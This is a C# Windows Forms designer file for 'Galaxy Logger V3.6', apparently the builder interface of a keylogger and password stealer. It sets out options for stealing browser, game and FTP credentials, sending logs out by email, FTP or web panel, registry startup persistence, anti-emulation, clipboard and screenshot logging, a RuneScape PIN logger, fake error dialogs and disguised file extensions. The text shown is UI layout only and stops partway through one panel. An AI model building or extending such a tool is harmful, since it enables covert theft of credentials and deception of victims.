namespace Galaxy_Logger
{
    partial class frmBuilder
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmBuilder));
            System.Windows.Forms.TreeNode treeNode1 = new System.Windows.Forms.TreeNode("Dashboard", 0, 0);
            System.Windows.Forms.TreeNode treeNode2 = new System.Windows.Forms.TreeNode("Delivery", 1, 1);
            System.Windows.Forms.TreeNode treeNode3 = new System.Windows.Forms.TreeNode("Installation");
            System.Windows.Forms.TreeNode treeNode4 = new System.Windows.Forms.TreeNode("General");
            System.Windows.Forms.TreeNode treeNode5 = new System.Windows.Forms.TreeNode("Miscellaneous");
            System.Windows.Forms.TreeNode treeNode6 = new System.Windows.Forms.TreeNode("Password Recovery");
            System.Windows.Forms.TreeNode treeNode7 = new System.Windows.Forms.TreeNode("Settings", new System.Windows.Forms.TreeNode[] {
            treeNode3,
            treeNode4,
            treeNode5,
            treeNode6});
            System.Windows.Forms.TreeNode treeNode8 = new System.Windows.Forms.TreeNode("Assembly");
            System.Windows.Forms.TreeNode treeNode9 = new System.Windows.Forms.TreeNode("Build");
            System.Windows.Forms.TreeNode treeNode10 = new System.Windows.Forms.TreeNode("Vaccine", 9, 9);
            System.Windows.Forms.TreeNode treeNode11 = new System.Windows.Forms.TreeNode("About", 10, 10);
            this.ilPasswordRecovery = new System.Windows.Forms.ImageList(this.components);
            this.ilTreeView = new System.Windows.Forms.ImageList(this.components);
            this.themeContainer = new Ambiance_ThemeContainer();
            this.tvMain = new System.Windows.Forms.TreeView();
            this.btnControlBox = new Ambiance_ControlBox();
            this.panelMiscellaneous = new System.Windows.Forms.Panel();
            this.lblDelayExecution = new Ambiance_Label();
            this.nudDelayExecution = new Ambiance_NumericUpDown();
            this.cbDelayExecution = new Ambiance_CheckBox();
            this.tbMessageBoxBody = new Amiance_TextBox();
            this.comboBoxMessageBoxType = new Ambiance_ComboBox();
            this.lblMessageBoxType = new Ambiance_Label();
            this.cbMessageBox = new Ambiance_CheckBox();
            this.tbMessageBoxTitle = new Amiance_TextBox();
            this.comboBoxFileType = new Ambiance_ComboBox();
            this.lblFileType = new Ambiance_Label();
            this.cbFileDownloader = new Ambiance_CheckBox();
            this.tbFileDownloader = new Amiance_TextBox();
            this.separator4 = new Ambiance_Separator();
            this.lblMiscellaneousSettings = new Ambiance_HeaderLabel();
            this.panelGeneral = new System.Windows.Forms.Panel();
            this.cbClearSavedPasswords = new Ambiance_CheckBox();
            this.cbRuneScapePinlogger = new Ambiance_CheckBox();
            this.cbProcessProtection = new Ambiance_CheckBox();
            this.cbAntiEmulation = new Ambiance_CheckBox();
            this.cbCaptureScreenshots = new Ambiance_CheckBox();
            this.cbMeltFile = new Ambiance_CheckBox();
            this.cbModifyTaskManager = new Ambiance_CheckBox();
            this.cbClipboardLogger = new Ambiance_CheckBox();
            this.lblMutex = new Ambiance_Label();
            this.tbMutex = new Amiance_TextBox();
            this.randomPool = new NSRandomPool();
            this.separator3 = new Ambiance_Separator();
            this.lblGeneralSettings = new Ambiance_HeaderLabel();
            this.panelPasswordRecovery = new System.Windows.Forms.Panel();
            this.lvPasswordRecovery = new System.Windows.Forms.ListView();
            this.chSoftware = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chVersions = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.cbPasswordRecovery = new Ambiance_Toggle();
            this.separator5 = new Ambiance_Separator();
            this.lblPasswordRecovery = new Ambiance_HeaderLabel();
            this.panelVaccine = new System.Windows.Forms.Panel();
            this.lblVaccineLog = new Ambiance_Label();
            this.lbVaccineLog = new Ambiance_ListBox();
            this.btnRemoveKeylogger = new Ambiance_Button_1();
            this.separator8 = new Ambiance_Separator();
            this.lblVaccine = new Ambiance_HeaderLabel();
            this.lblVaccineInfo = new Ambiance_Label();
            this.panelBuild = new System.Windows.Forms.Panel();
            this.pbIcon = new System.Windows.Forms.PictureBox();
            this.lbBuildLog = new Ambiance_ListBox();
            this.lblBuildLog = new Ambiance_Label();
            this.btnBrowseIcon = new Ambiance_Button_1();
            this.tbIconPath = new Amiance_TextBox();
            this.cbChangeIcon = new Ambiance_CheckBox();
            this.separator7 = new Ambiance_Separator();
            this.lblBuild = new Ambiance_HeaderLabel();
            this.btnBuild = new Ambiance_Button_1();
            this.panelInstallation = new System.Windows.Forms.Panel();
            this.gbOther = new System.Windows.Forms.GroupBox();
            this.cbHideFile = new Ambiance_CheckBox();
            this.cbStartupPersistence = new Ambiance_CheckBox();
            this.gbStartup = new System.Windows.Forms.GroupBox();
            this.cbHKLM = new Ambiance_CheckBox();
            this.cbHKCU = new Ambiance_CheckBox();
            this.tbHKLM = new Amiance_TextBox();
            this.tbHKCU = new Amiance_TextBox();
            this.gbInstallation = new System.Windows.Forms.GroupBox();
            this.tbProcess = new Amiance_TextBox();
            this.lblProcess = new Ambiance_Label();
            this.comboBoxDirectory = new Ambiance_ComboBox();
            this.lblSubfolder = new Ambiance_Label();
            this.tbSubfolder = new Amiance_TextBox();
            this.lblDirectory = new Ambiance_Label();
            this.cbInstallation = new Ambiance_Toggle();
            this.separator2 = new Ambiance_Separator();
            this.lblInstallation = new Ambiance_HeaderLabel();
            this.panelDelivery = new System.Windows.Forms.Panel();
            this.btnTestDelivery = new Ambiance_Button_1();
            this.nudLogInterval = new Ambiance_NumericUpDown();
            this.lblLogInterval = new Ambiance_Label();
            this.gbWebPanel = new System.Windows.Forms.GroupBox();
            this.tbWebPanelUploadKey = new Amiance_TextBox();
            this.gbFTP = new System.Windows.Forms.GroupBox();
            this.tbFTPPassword = new Amiance_TextBox();
            this.tbFTPUsername = new Amiance_TextBox();
            this.tbFTPServer = new Amiance_TextBox();
            this.rbPanel = new Ambiance_RadioButton();
            this.rbFTP = new Ambiance_RadioButton();
            this.rbEmail = new Ambiance_RadioButton();
            this.gbEmail = new System.Windows.Forms.GroupBox();
            this.cbSSL = new Ambiance_CheckBox();
            this.tbEmailPort = new Amiance_TextBox();
            this.tbEmailServer = new Amiance_TextBox();
            this.tbEmailPassword = new Amiance_TextBox();
            this.tbEmailUsername = new Amiance_TextBox();
            this.separator1 = new Ambiance_Separator();
            this.lblDeliveryMethod = new Ambiance_HeaderLabel();
            this.panelDashboard = new System.Windows.Forms.Panel();
            this.ambiance_HeaderLabel4 = new Ambiance_HeaderLabel();
            this.ambiance_HeaderLabel3 = new Ambiance_HeaderLabel();
            this.ambiance_HeaderLabel2 = new Ambiance_HeaderLabel();
            this.ambiance_HeaderLabel1 = new Ambiance_HeaderLabel();
            this.panelAbout = new System.Windows.Forms.Panel();
            this.pbAbout = new System.Windows.Forms.PictureBox();
            this.lblAboutInfo = new Ambiance_Label();
            this.separator9 = new Ambiance_Separator();
            this.lblAbout = new Ambiance_HeaderLabel();
            this.panelAssembly = new System.Windows.Forms.Panel();
            this.lblVersion = new Ambiance_Label();
            this.lblCopyright = new Ambiance_Label();
            this.lblProduct = new Ambiance_Label();
            this.lblCompany = new Ambiance_Label();
            this.lblDescriptionAsm = new Ambiance_Label();
            this.lblTitle = new Ambiance_Label();
            this.tbVersion = new Amiance_TextBox();
            this.tbCopyright = new Amiance_TextBox();
            this.tbProduct = new Amiance_TextBox();
            this.tbCompany = new Amiance_TextBox();
            this.tbDescription = new Amiance_TextBox();
            this.tbTitle = new Amiance_TextBox();
            this.cbChangeAssembly = new Ambiance_CheckBox();
            this.separator6 = new Ambiance_Separator();
            this.lblAssembly = new Ambiance_HeaderLabel();
            this.themeContainer.SuspendLayout();
            this.panelMiscellaneous.SuspendLayout();
            this.panelGeneral.SuspendLayout();
            this.panelPasswordRecovery.SuspendLayout();
            this.panelVaccine.SuspendLayout();
            this.panelBuild.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbIcon)).BeginInit();
            this.panelInstallation.SuspendLayout();
            this.gbOther.SuspendLayout();
            this.gbStartup.SuspendLayout();
            this.gbInstallation.SuspendLayout();
            this.panelDelivery.SuspendLayout();
            this.gbWebPanel.SuspendLayout();
            this.gbFTP.SuspendLayout();
            this.gbEmail.SuspendLayout();
            this.panelDashboard.SuspendLayout();
            this.panelAbout.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbAbout)).BeginInit();
            this.panelAssembly.SuspendLayout();
            this.SuspendLayout();
            // 
            // ilPasswordRecovery
            // 
            this.ilPasswordRecovery.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("ilPasswordRecovery.ImageStream")));
            this.ilPasswordRecovery.TransparentColor = System.Drawing.Color.Transparent;
            this.ilPasswordRecovery.Images.SetKeyName(0, "internet explorer.png");
            this.ilPasswordRecovery.Images.SetKeyName(1, "firefox.png");
            this.ilPasswordRecovery.Images.SetKeyName(2, "chrome.png");
            this.ilPasswordRecovery.Images.SetKeyName(3, "opera.png");
            this.ilPasswordRecovery.Images.SetKeyName(4, "safari_browser.png");
            this.ilPasswordRecovery.Images.SetKeyName(5, "seamonkey.png");
            this.ilPasswordRecovery.Images.SetKeyName(6, "minecraft.png");
            this.ilPasswordRecovery.Images.SetKeyName(7, "windows.png");
            this.ilPasswordRecovery.Images.SetKeyName(8, "filezilla.png");
            this.ilPasswordRecovery.Images.SetKeyName(9, "coreftp.png");
            // 
            // ilTreeView
            // 
            this.ilTreeView.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("ilTreeView.ImageStream")));
            this.ilTreeView.TransparentColor = System.Drawing.Color.Transparent;
            this.ilTreeView.Images.SetKeyName(0, "application_view_list.png");
            this.ilTreeView.Images.SetKeyName(1, "server_connect.png");
            this.ilTreeView.Images.SetKeyName(2, "cog.png");
            this.ilTreeView.Images.SetKeyName(3, "folder_bug.png");
            this.ilTreeView.Images.SetKeyName(4, "page_white_wrench.png");
            this.ilTreeView.Images.SetKeyName(5, "drive_cd_empty.png");
            this.ilTreeView.Images.SetKeyName(6, "key.png");
            this.ilTreeView.Images.SetKeyName(7, "text_list_bullets.png");
            this.ilTreeView.Images.SetKeyName(8, "brick.png");
            this.ilTreeView.Images.SetKeyName(9, "bug_delete.png");
            this.ilTreeView.Images.SetKeyName(10, "information.png");
            // 
            // themeContainer
            // 
            this.themeContainer.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
            this.themeContainer.Controls.Add(this.tvMain);
            this.themeContainer.Controls.Add(this.btnControlBox);
            this.themeContainer.Controls.Add(this.panelBuild);
            this.themeContainer.Controls.Add(this.panelInstallation);
            this.themeContainer.Controls.Add(this.panelDelivery);
            this.themeContainer.Controls.Add(this.panelDashboard);
            this.themeContainer.Controls.Add(this.panelAbout);
            this.themeContainer.Controls.Add(this.panelAssembly);
            this.themeContainer.Controls.Add(this.panelMiscellaneous);
            this.themeContainer.Controls.Add(this.panelGeneral);
            this.themeContainer.Controls.Add(this.panelPasswordRecovery);
            this.themeContainer.Controls.Add(this.panelVaccine);
            this.themeContainer.Dock = System.Windows.Forms.DockStyle.Fill;
            this.themeContainer.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.themeContainer.Location = new System.Drawing.Point(0, 0);
            this.themeContainer.Name = "themeContainer";
            this.themeContainer.Padding = new System.Windows.Forms.Padding(20, 56, 20, 16);
            this.themeContainer.RoundCorners = true;
            this.themeContainer.Sizable = false;
            this.themeContainer.Size = new System.Drawing.Size(765, 518);
            this.themeContainer.SmartBounds = true;
            this.themeContainer.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.themeContainer.TabIndex = 0;
            this.themeContainer.Text = "Galaxy Logger V3.6";
            this.themeContainer.Click += new System.EventHandler(this.themeContainer_Click);
            // 
            // tvMain
            // 
            this.tvMain.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(241)))), ((int)(((byte)(243)))));
            this.tvMain.ImageIndex = 0;
            this.tvMain.ImageList = this.ilTreeView;
            this.tvMain.Location = new System.Drawing.Point(23, 59);
            this.tvMain.Name = "tvMain";
            treeNode1.ImageIndex = 0;
            treeNode1.Name = "nodeDashboard";
            treeNode1.SelectedImageIndex = 0;
            treeNode1.Text = "Dashboard";
            treeNode2.ImageIndex = 1;
            treeNode2.Name = "nodeDelivery";
            treeNode2.SelectedImageIndex = 1;
            treeNode2.Text = "Delivery";
            treeNode3.ImageIndex = 3;
            treeNode3.Name = "nodeInstallation";
            treeNode3.SelectedImageKey = "folder_bug.png";
            treeNode3.Text = "Installation";
            treeNode4.ImageIndex = 4;
            treeNode4.Name = "nodeGeneral";
            treeNode4.SelectedImageKey = "page_white_wrench.png";
            treeNode4.Text = "General";
            treeNode5.ImageIndex = 5;
            treeNode5.Name = "nodeMiscellaneous";
            treeNode5.SelectedImageKey = "drive_cd_empty.png";
            treeNode5.Text = "Miscellaneous";
            treeNode6.ImageIndex = 6;
            treeNode6.Name = "nodePasswordRecovery";
            treeNode6.SelectedImageKey = "key.png";
            treeNode6.Text = "Password Recovery";
            treeNode7.ImageIndex = 2;
            treeNode7.Name = "nodeSettings";
            treeNode7.SelectedImageKey = "cog.png";
            treeNode7.Text = "Settings";
            treeNode8.ImageIndex = 7;
            treeNode8.Name = "nodeAssembly";
            treeNode8.SelectedImageKey = "text_list_bullets.png";
            treeNode8.Text = "Assembly";
            treeNode9.ImageIndex = 8;
            treeNode9.Name = "nodeBuild";
            treeNode9.SelectedImageKey = "brick.png";
            treeNode9.Text = "Build";
            treeNode10.ImageIndex = 9;
            treeNode10.Name = "nodeVaccine";
            treeNode10.SelectedImageIndex = 9;
            treeNode10.Text = "Vaccine";
            treeNode11.ImageIndex = 10;
            treeNode11.Name = "nodeAbout";
            treeNode11.SelectedImageIndex = 10;
            treeNode11.Text = "About";
            this.tvMain.Nodes.AddRange(new System.Windows.Forms.TreeNode[] {
            treeNode1,
            treeNode2,
            treeNode7,
            treeNode8,
            treeNode9,
            treeNode10,
            treeNode11});
            this.tvMain.SelectedImageIndex = 0;
            this.tvMain.Size = new System.Drawing.Size(217, 435);
            this.tvMain.TabIndex = 2;
            this.tvMain.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.tvMain_AfterSelect);
            // 
            // btnControlBox
            // 
            this.btnControlBox.BackColor = System.Drawing.Color.Transparent;
            this.btnControlBox.EnableMaximize = false;
            this.btnControlBox.Font = new System.Drawing.Font("Marlett", 7F);
            this.btnControlBox.Location = new System.Drawing.Point(5, 13);
            this.btnControlBox.Name = "btnControlBox";
            this.btnControlBox.Size = new System.Drawing.Size(44, 22);
            this.btnControlBox.TabIndex = 0;
            this.btnControlBox.Text = "ambiance_ControlBox1";
            // 
            // panelMiscellaneous
            // 
            this.panelMiscellaneous.Controls.Add(this.lblDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.nudDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.cbDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.tbMessageBoxBody);
            this.panelMiscellaneous.Controls.Add(this.comboBoxMessageBoxType);
            this.panelMiscellaneous.Controls.Add(this.lblMessageBoxType);
            this.panelMiscellaneous.Controls.Add(this.cbMessageBox);
            this.panelMiscellaneous.Controls.Add(this.tbMessageBoxTitle);
            this.panelMiscellaneous.Controls.Add(this.comboBoxFileType);
            this.panelMiscellaneous.Controls.Add(this.lblFileType);
            this.panelMiscellaneous.Controls.Add(this.cbFileDownloader);
            this.panelMiscellaneous.Controls.Add(this.tbFileDownloader);
            this.panelMiscellaneous.Controls.Add(this.separator4);
            this.panelMiscellaneous.Controls.Add(this.lblMiscellaneousSettings);
            this.panelMiscellaneous.Location = new System.Drawing.Point(246, 59);
            this.panelMiscellaneous.Name = "panelMiscellaneous";
            this.panelMiscellaneous.Size = new System.Drawing.Size(498, 435);
            this.panelMiscellaneous.TabIndex = 7;
            // 
            // lblDelayExecution
            // 
            this.lblDelayExecution.AutoSize = true;
            this.lblDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.lblDelayExecution.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblDelayExecution.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDelayExecution.Location = new System.Drawing.Point(324, 263);
            this.lblDelayExecution.Name = "lblDelayExecution";
            this.lblDelayExecution.Size = new System.Drawing.Size(74, 20);
            this.lblDelayExecution.TabIndex = 31;
            this.lblDelayExecution.Text = "(Seconds)";
            // 
            // nudDelayExecution
            // 
            this.nudDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.nudDelayExecution.Font = new System.Drawing.Font("Tahoma", 11F);
            this.nudDelayExecution.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(76)))));
            this.nudDelayExecution.Location = new System.Drawing.Point(181, 261);
            this.nudDelayExecution.Maximum = ((long)(100));
            this.nudDelayExecution.Minimum = ((long)(0));
            this.nudDelayExecution.MinimumSize = new System.Drawing.Size(93, 28);
            this.nudDelayExecution.Name = "nudDelayExecution";
            this.nudDelayExecution.Size = new System.Drawing.Size(127, 28);
            this.nudDelayExecution.TabIndex = 30;
            this.nudDelayExecution.Text = "ambiance_NumericUpDown2";
            this.nudDelayExecution.TextAlignment = Ambiance_NumericUpDown._TextAlignment.Near;
            this.nudDelayExecution.Value = ((long)(5));
            // 
            // cbDelayExecution
            // 
            this.cbDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.cbDelayExecution.Checked = false;
            this.cbDelayExecution.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbDelayExecution.Location = new System.Drawing.Point(28, 268);
            this.cbDelayExecution.Name = "cbDelayExecution";
            this.cbDelayExecution.Size = new System.Drawing.Size(171, 19);
            this.cbDelayExecution.TabIndex = 29;
            this.cbDelayExecution.Text = "Delay Execution";
            // 
            // tbMessageBoxBody
            // 
            this.tbMessageBoxBody.BackColor = System.Drawing.Color.Transparent;
            this.tbMessageBoxBody.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMessageBoxBody.ForeColor = System.Drawing.Color.DimGray;
            this.tbMessageBoxBody.Location = new System.Drawing.Point(28, 193);
            this.tbMessageBoxBody.MaxLength = 32767;
            this.tbMessageBoxBody.Multiline = true;
            this.tbMessageBoxBody.Name = "tbMessageBoxBody";
            this.tbMessageBoxBody.ReadOnly = false;
            this.tbMessageBoxBody.Size = new System.Drawing.Size(437, 60);
            this.tbMessageBoxBody.TabIndex = 28;
            this.tbMessageBoxBody.Text = "The program can\'t start because nspr4.dll is missing from your computer. Try rein" +
    "stalling the program to fix this problem.";
            this.tbMessageBoxBody.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMessageBoxBody.UseSystemPasswordChar = false;
            // 
            // comboBoxMessageBoxType
            // 
            this.comboBoxMessageBoxType.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxMessageBoxType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxMessageBoxType.DropDownHeight = 100;
            this.comboBoxMessageBoxType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxMessageBoxType.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxMessageBoxType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxMessageBoxType.FormattingEnabled = true;
            this.comboBoxMessageBoxType.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxMessageBoxType.IntegralHeight = false;
            this.comboBoxMessageBoxType.ItemHeight = 20;
            this.comboBoxMessageBoxType.Items.AddRange(new object[] {
            "Error",
            "Warning",
            "Information"});
            this.comboBoxMessageBoxType.Location = new System.Drawing.Point(270, 159);
            this.comboBoxMessageBoxType.Name = "comboBoxMessageBoxType";
            this.comboBoxMessageBoxType.Size = new System.Drawing.Size(195, 26);
            this.comboBoxMessageBoxType.StartIndex = 0;
            this.comboBoxMessageBoxType.TabIndex = 27;
            // 
            // lblMessageBoxType
            // 
            this.lblMessageBoxType.AutoSize = true;
            this.lblMessageBoxType.BackColor = System.Drawing.Color.Transparent;
            this.lblMessageBoxType.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblMessageBoxType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMessageBoxType.Location = new System.Drawing.Point(317, 132);
            this.lblMessageBoxType.Name = "lblMessageBoxType";
            this.lblMessageBoxType.Size = new System.Drawing.Size(103, 20);
            this.lblMessageBoxType.TabIndex = 26;
            this.lblMessageBoxType.Text = "Message Type";
            // 
            // cbMessageBox
            // 
            this.cbMessageBox.BackColor = System.Drawing.Color.Transparent;
            this.cbMessageBox.Checked = false;
            this.cbMessageBox.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbMessageBox.Location = new System.Drawing.Point(28, 134);
            this.cbMessageBox.Name = "cbMessageBox";
            this.cbMessageBox.Size = new System.Drawing.Size(171, 19);
            this.cbMessageBox.TabIndex = 25;
            this.cbMessageBox.Text = "Fake Message Box";
            // 
            // tbMessageBoxTitle
            // 
            this.tbMessageBoxTitle.BackColor = System.Drawing.Color.Transparent;
            this.tbMessageBoxTitle.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMessageBoxTitle.ForeColor = System.Drawing.Color.DimGray;
            this.tbMessageBoxTitle.Location = new System.Drawing.Point(28, 159);
            this.tbMessageBoxTitle.MaxLength = 32767;
            this.tbMessageBoxTitle.Multiline = false;
            this.tbMessageBoxTitle.Name = "tbMessageBoxTitle";
            this.tbMessageBoxTitle.ReadOnly = false;
            this.tbMessageBoxTitle.Size = new System.Drawing.Size(236, 28);
            this.tbMessageBoxTitle.TabIndex = 24;
            this.tbMessageBoxTitle.Text = "Application Error";
            this.tbMessageBoxTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMessageBoxTitle.UseSystemPasswordChar = false;
            // 
            // comboBoxFileType
            // 
            this.comboBoxFileType.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxFileType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxFileType.DropDownHeight = 100;
            this.comboBoxFileType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxFileType.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxFileType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxFileType.FormattingEnabled = true;
            this.comboBoxFileType.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxFileType.IntegralHeight = false;
            this.comboBoxFileType.ItemHeight = 20;
            this.comboBoxFileType.Items.AddRange(new object[] {
            ".exe",
            ".scr",
            ".com",
            ".pif",
            ".bat",
            ".cmd",
            ".vbs",
            ".jpg",
            ".png",
            ".gif",
            ".mp3",
            ".mp4",
            ".avi"});
            this.comboBoxFileType.Location = new System.Drawing.Point(270, 86);
            this.comboBoxFileType.Name = "comboBoxFileType";
            this.comboBoxFileType.Size = new System.Drawing.Size(195, 26);
            this.comboBoxFileType.StartIndex = 0;
            this.comboBoxFileType.TabIndex = 23;
            // 
            // lblFileType
            // 
            this.lblFileType.AutoSize = true;
            this.lblFileType.BackColor = System.Drawing.Color.Transparent;
            this.lblFileType.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblFileType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblFileType.Location = new System.Drawing.Point(329, 59);
            this.lblFileType.Name = "lblFileType";
            this.lblFileType.Size = new System.Drawing.Size(68, 20);
            this.lblFileType.TabIndex = 22;
            this.lblFileType.Text = "File Type";
            // 
            // cbFileDownloader
            // 
            this.cbFileDownloader.BackColor = System.Drawing.Color.Transparent;
            this.cbFileDownloader.Checked = false;
            this.cbFileDownloader.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbFileDownloader.Location = new System.Drawing.Point(28, 61);
            this.cbFileDownloader.Name = "cbFileDownloader";
            this.cbFileDownloader.Size = new System.Drawing.Size(171, 19);
            this.cbFileDownloader.TabIndex = 21;
            this.cbFileDownloader.Text = "File Downloader";
            // 
            // tbFileDownloader
            // 
            this.tbFileDownloader.BackColor = System.Drawing.Color.Transparent;
            this.tbFileDownloader.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFileDownloader.ForeColor = System.Drawing.Color.DimGray;
            this.tbFileDownloader.Location = new System.Drawing.Point(28, 86);
            this.tbFileDownloader.MaxLength = 32767;
            this.tbFileDownloader.Multiline = false;
            this.tbFileDownloader.Name = "tbFileDownloader";
            this.tbFileDownloader.ReadOnly = false;
            this.tbFileDownloader.Size = new System.Drawing.Size(236, 28);
            this.tbFileDownloader.TabIndex = 20;
            this.tbFileDownloader.Text = "http://www.example.com/file.exe";
            this.tbFileDownloader.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFileDownloader.UseSystemPasswordChar = false;
            // 
            // separator4
            // 
            this.separator4.Location = new System.Drawing.Point(28, 38);
            this.separator4.Name = "separator4";
            this.separator4.Size = new System.Drawing.Size(446, 10);
            this.separator4.TabIndex = 19;
            this.separator4.Text = "ambiance_Separator4";
            // 
            // lblMiscellaneousSettings
            // 
            this.lblMiscellaneousSettings.AutoSize = true;
            this.lblMiscellaneousSettings.BackColor = System.Drawing.Color.Transparent;
            this.lblMiscellaneousSettings.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblMiscellaneousSettings.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMiscellaneousSettings.Location = new System.Drawing.Point(24, 19);
            this.lblMiscellaneousSettings.Name = "lblMiscellaneousSettings";
            this.lblMiscellaneousSettings.Size = new System.Drawing.Size(168, 20);
            this.lblMiscellaneousSettings.TabIndex = 18;
            this.lblMiscellaneousSettings.Text = "Miscellaneous Settings";
            // 
            // panelGeneral
            // 
            this.panelGeneral.Controls.Add(this.cbClearSavedPasswords);
            this.panelGeneral.Controls.Add(this.cbRuneScapePinlogger);
            this.panelGeneral.Controls.Add(this.cbProcessProtection);
            this.panelGeneral.Controls.Add(this.cbAntiEmulation);
            this.panelGeneral.Controls.Add(this.cbCaptureScreenshots);
            this.panelGeneral.Controls.Add(this.cbMeltFile);
            this.panelGeneral.Controls.Add(this.cbModifyTaskManager);
            this.panelGeneral.Controls.Add(this.cbClipboardLogger);
            this.panelGeneral.Controls.Add(this.lblMutex);
            this.panelGeneral.Controls.Add(this.tbMutex);
            this.panelGeneral.Controls.Add(this.randomPool);
            this.panelGeneral.Controls.Add(this.separator3);
            this.panelGeneral.Controls.Add(this.lblGeneralSettings);
            this.panelGeneral.Location = new System.Drawing.Point(246, 59);
            this.panelGeneral.Name = "panelGeneral";
            this.panelGeneral.Size = new System.Drawing.Size(498, 435);
            this.panelGeneral.TabIndex = 6;
            // 
            // cbClearSavedPasswords
            // 
            this.cbClearSavedPasswords.BackColor = System.Drawing.Color.Transparent;
            this.cbClearSavedPasswords.Checked = false;
            this.cbClearSavedPasswords.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbClearSavedPasswords.Location = new System.Drawing.Point(272, 353);
            this.cbClearSavedPasswords.Name = "cbClearSavedPasswords";
            this.cbClearSavedPasswords.Size = new System.Drawing.Size(204, 19);
            this.cbClearSavedPasswords.TabIndex = 29;
            this.cbClearSavedPasswords.Text = "Clear Saved Passwords";
            // 
            // cbRuneScapePinlogger
            // 
            this.cbRuneScapePinlogger.BackColor = System.Drawing.Color.Transparent;
            this.cbRuneScapePinlogger.Checked = false;
            this.cbRuneScapePinlogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbRuneScapePinlogger.Location = new System.Drawing.Point(272, 310);
            this.cbRuneScapePinlogger.Name = "cbRuneScapePinlogger";
            this.cbRuneScapePinlogger.Size = new System.Drawing.Size(204, 19);
            this.cbRuneScapePinlogger.TabIndex = 28;
            this.cbRuneScapePinlogger.Text = "RuneScape Pinlogger";
            // 
            // cbProcessProtection
            // 
            this.cbProcessProtection.BackColor = System.Drawing.Color.Transparent;
            this.cbProcessProtection.Checked = false;
            this.cbProcessProtection.Enabled = false;
            this.cbProcessProtection.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbProcessProtection.Location = new System.Drawing.Point(272, 266);
            this.cbProcessProtection.Name = "cbProcessProtection";
            this.cbProcessProtection.Size = new System.Drawing.Size(204, 19);
            this.cbProcessProtection.TabIndex = 27;
            this.cbProcessProtection.Text = "Process Protection";
            // 
            // cbAntiEmulation
            // 
            this.cbAntiEmulation.BackColor = System.Drawing.Color.Transparent;
            this.cbAntiEmulation.Checked = false;
